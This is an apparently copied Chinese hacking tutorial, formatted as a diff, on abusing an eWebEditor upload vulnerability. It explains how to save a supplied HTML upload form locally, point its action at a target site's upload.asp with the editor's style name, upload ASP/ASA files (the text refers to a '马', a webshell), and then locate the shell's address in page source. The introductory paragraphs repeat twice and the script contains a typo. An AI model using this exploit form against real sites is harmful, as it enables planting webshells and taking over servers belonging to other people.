@@ -1,0 +1,69 @@
+有时候进了ewebeditor编辑器后台，上传类型修改后可以上传asp和asa等等。
+
+可是由于一些原因.却上传不了或上传后提示找不到文件，或者无法显示等等。
+
+用法:在地址上填编辑器上传漏洞地址，样式名上填编辑器的样式名，然后上传你所要上传的文件就行了。
+
+然后,在源文件找马的地址。
+
+有时候进了ewebeditor编辑器后台，上传类型修改后可以上传asp和asa等等。
+ 
+可是由于一些原因.却上传不了或上传后提示找不到文件，或者无法显示等等。
+ 
+用法:在地址上填编辑器上传漏洞地址，样式名上填编辑器的样式名，然后上传你所要上传的文件就行了。
+ 
+然后,在源文件找地址。
+
+保存为html
+ 
+<script language=javascript>parent.UploadError('无效的样式ID号，请通过页面上的链接进行操作！');history.back()</script>  
+<HTML>  
+<HEAD>  
+<TITLE>文件上传</TITLE>  
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">  
+<style type="text/css">   
+body, a, table, div, span, td, th, input, select{font:9pt;font-family: "宋体", Verdana, Arial, Helvetica, sans-serif;}  
+body {padding:0px;margin:0px}  
+</style>  
+<script language="JavaScript" src="dialog/dialog.js"></script>  
+</head>  
+<body bgcolor=menu>  
+<form action=" www.2cto.com /path/upload.asp?action=save&type=&style=样式名" method=post name=myform enctype="multipart/form-data">  
+<input type=file name=uploadfile size=1 style="width:100%">  
+<input type=submit value="上传了"></input>  
+<script language=javascript>  
+var sAllowExt = "";  
+// 检测上传表单  
+function CheckUploadForm() {  
+if (!IsExt(document.myform.uploadfile.value,sAllowExt)){  
+   parent.UploadError("提示：\n\n请选择一个有效的文件，\n支持的格式有（"+sAllowExt+"）！");  
+   return false;  
+}  
+return true  
+}   
+// 提交事件加入检测表单  
+var oForm = document.myform ;  
+oForm.attachEvent("onsubmit", CheckUploadForm) ;  
+if (! oForm.submitUpload) oForm.submitUpload = new Array() ;  
+oForm.submitUpload[oForm.submitUpload.length] = CheckUploadForm ;  
+if (! oForm.originalSubmit) {  
+oFormoForm.originalSubmit = oForm.submit ;  
+oForm.submit = function() {  
+   if (this.submitUpload) {  
+    for (var i = 0 ; i < this.submitUpload.length ; i++) {  
+     this.submitUpload() ;  
+    }  
+   }  
+   this.originalSubmit() ;  
+}  
+}  
+// 上传表单已装入完成  
+try {  
+parent.UploadLoaded();  
+}  
+catch(e){  
+}  
+</script>  
+</body>  
+</html>   
+
